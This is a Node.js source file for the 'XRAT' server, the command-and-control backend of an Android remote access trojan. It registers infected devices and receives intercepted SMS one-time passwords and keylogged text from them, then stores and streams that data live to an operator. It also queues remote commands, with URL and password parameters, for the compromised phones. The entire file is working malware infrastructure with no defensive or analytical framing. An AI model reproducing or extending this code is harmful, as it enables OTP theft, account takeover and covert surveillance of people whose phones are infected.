const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

app.use(express.json());
app.use(cors());

const db = new sqlite3.Database('./xrat.db');

db.run(`CREATE TABLE IF NOT EXISTS devices (
  id TEXT PRIMARY KEY,
  name TEXT,
  model TEXT,
  android_version TEXT,
  online INTEGER DEFAULT 0,
  last_seen INTEGER
)`);

db.run(`CREATE TABLE IF NOT EXISTS logs (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT,
  type TEXT,
  data TEXT,
  timestamp INTEGER
)`);

db.run(`CREATE TABLE IF NOT EXISTS commands (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT,
  action TEXT,
  params TEXT,
  status TEXT DEFAULT 'pending',
  created_at INTEGER
)`);

app.post('/api/register', (req, res) => {
  const { device_id, model, android_version } = req.body;
  const now = Date.now();
  db.run(
    `INSERT OR REPLACE INTO devices (id, name, model, android_version, online, last_seen)
     VALUES (?, ?, ?, ?, 1, ?)`,
    [device_id, model, model, android_version, now],
    (err) => {
      if (err) return res.status(500).json({ error: err.message });
      io.emit('device_online', { device_id, model });
      res.json({ status: 'ok' });
    }
  );
});

app.post('/api/forward', (req, res) => {
  const { device_id, sender, otp, message, text, package_name } = req.body;
  const now = Date.now();
  let type = 'unknown', data = '';
  if (otp) {
    type = 'otp';
    data = JSON.stringify({ sender, otp, message });
  } else if (text) {
    type = 'keylog';
    data = JSON.stringify({ text, package_name });
  }
  db.run(
    `INSERT INTO logs (device_id, type, data, timestamp) VALUES (?, ?, ?, ?)`,
    [device_id, type, data, now],
    (err) => {
      if (err) return res.status(500).json({ error: err.message });
      io.emit('new_log', { device_id, type, data, timestamp: now });
      res.json({ status: 'ok' });
    }
  );
});

app.get('/api/devices', (req, res) => {
  db.all(`SELECT * FROM devices ORDER BY last_seen DESC`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/command', (req, res) => {
  const { device_id, action, duration, url, text, password } = req.body;
  const now = Date.now();
  const params = JSON.stringify({ duration, url, text, password });
  db.run(
    `INSERT INTO commands (device_id, action, params, status, created_at)
     VALUES (?, ?, ?, 'pending', ?)`,
    [device_id, action, params, now],
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      io.to(device_id).emit('command', { action, duration, url, text, password });
      res.json({ status: 'ok', command_id: this.lastID });
    }
  );
});

app.get('/api/pending_commands/:device_id', (req, res) => {
  const device_id = req.params.device_id;
  db.all(
    `SELECT * FROM commands WHERE device_id = ? AND status = 'pending'`,
    [device_id],
    (err, rows) => {
      if (err) return res.status(500).json({ error: err.message });
      rows.forEach(row => {
        db.run(`UPDATE commands SET status = 'sent' WHERE id = ?`, [row.id]);
      });
      res.json(rows);
    }
  );
});

io.on('connection', (socket) => {
  console.log('Admin connected:', socket.id);
  socket.on('subscribe_device', (device_id) => {
    socket.join(device_id);
    console.log(`Admin subscribe to: ${device_id}`);
  });
  socket.on('disconnect', () => {
    console.log('Admin disconnected');
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ XRAT Server running on port ${PORT}`);
});
